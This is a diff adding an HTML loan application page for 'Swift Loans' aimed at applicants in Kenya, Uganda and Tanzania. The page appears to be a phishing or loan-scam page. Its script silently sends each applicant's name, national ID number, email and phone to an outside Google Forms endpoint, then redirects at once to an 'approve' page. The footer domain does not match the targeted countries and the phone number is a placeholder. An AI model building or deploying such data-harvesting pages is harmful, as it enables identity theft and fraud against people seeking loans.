@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Apply for a Loan - Swift Loans</title>
+</head>
+<body style="font-family:'Segoe UI', Tahoma, sans-serif; margin:0; padding:0; background-color:#f5f8fc; color:#333;">
+
+<header style="background-color:#004aad; display:flex; justify-content:space-between; align-items:center; padding:15px 20px; box-shadow:0 2px 5px rgba(0,0,0,0.1);">
+    <img src="swift.jpeg" alt="Swift Logo" style="height:45px;">
+    <nav>
+        <a href="index.html" style="margin-left:20px; text-decoration:none; color:#fff; font-weight:bold;">Home</a>
+        <a href="apply.html" style="margin-left:20px; text-decoration:none; color:#fff; font-weight:bold;">Apply Now</a>
+        <a href="#contact" style="margin-left:20px; text-decoration:none; color:#fff; font-weight:bold;">Contact Us</a>
+    </nav>
+</header>
+
+<div style="width:90%; max-width:600px; background:#fff; margin:40px auto; padding:30px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+    <h2 style="color:#004aad; margin-bottom:20px; text-align:center;">Loan Application Form</h2>
+    <form id="loanForm">
+
+        <label for="fullname" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Full Name</label>
+        <input type="text" id="fullname" name="entry.131310469" placeholder="Enter your full name" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+
+        <label for="idnumber" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">ID Number</label>
+        <input type="text" id="idnumber" name="entry.648227051" placeholder="Enter your national ID number" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+
+        <label for="email" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Email Address</label>
+        <input type="email" id="email" name="entry.360054432" placeholder="Enter your email" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+
+        <label for="phone" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Phone Number</label>
+        <input type="tel" id="phone" name="entry.1894608059" placeholder="e.g. 0712 345 678" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+
+        <label for="country" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Country</label>
+        <select id="country" name="entry.1411494955" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+            <option value="">-- Select Your Country --</option>
+            <option value="KENYA">Kenya</option>
+            <option value="UGANDA">Uganda</option>
+            <option value="TANZANIA">Tanzania</option>
+        </select>
+
+        <label for="loan-type" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Loan Type</label>
+        <select id="loan-type" name="entry.1140535369" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+            <option value="">-- Select Loan Type --</option>
+            <option value="Personal loans">Personal Loan</option>
+            <option value="Easy loans">Easy Cash Loan</option>
+            <option value="Vet loans">Vet Loan</option>
+            <option value="Business loans">Business Loan</option>
+            <option value="Emergency loans">Emergency Cash Loan</option>
+        </select>
+
+        <label for="amount" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Loan Amount</label>
+        <input type="text" id="amount" name="entry.1412054384" placeholder="Enter amount" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;">
+
+        <label for="purpose" style="display:block; margin-top:15px; font-weight:bold; color:#004aad;">Purpose of Loan</label>
+        <textarea id="purpose" name="entry.1699815757" rows="4" placeholder="Briefly describe why you need this loan" required style="width:100%; padding:10px; margin-top:5px; border:1px solid #ccd6f6; border-radius:6px; font-size:14px;"></textarea>
+
+        <button type="submit" style="background-color:#ffd43b; color:#004aad; font-size:16px; padding:12px 20px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:20px; width:100%;">Submit Application</button>
+    </form>
+</div>
+
+<footer id="contact" style="background-color:#002b66; color:white; text-align:center; padding:20px; margin-top:40px;">
+    <p><a href="https://swiftloans.com.au" style="color:#ffd43b; text-decoration:none;">swiftloans.com.au</a> | Call us: +123-456-7890</p>
+</footer>
+
+<script>
+const form = document.getElementById('loanForm');
+const countrySelect = document.getElementById("country");
+const amountInput = document.getElementById("amount");
+
+// Currency formatting
+let currentCurrency = "";
+countrySelect.addEventListener("change", () => {
+    currentCurrency = countrySelect.value;
+    amountInput.value = "";
+    amountInput.placeholder = `Enter amount in ${currentCurrency}`;
+});
+amountInput.addEventListener("input", () => {
+    let value = amountInput.value.replace(/[^\d]/g, "");
+    if (currentCurrency) {
+        amountInput.value = `${currentCurrency} ${value}`;
+    } else {
+        amountInput.value = value;
+    }
+});
+
+// Form submission and redirect
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(form);
+
+    // Send data to Google Form
+    fetch('https://docs.google.com/forms/d/e/1FAIpQLScHzl8Hn2InnVmM5MHr8dLU30y1zSncZv32LD-7dvs4UpbwzQ/formResponse', {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+    });
+
+    // Redirect immediately
+    window.location.href = "approve.html";
+});
+</script>
+
+</body>
+</html>
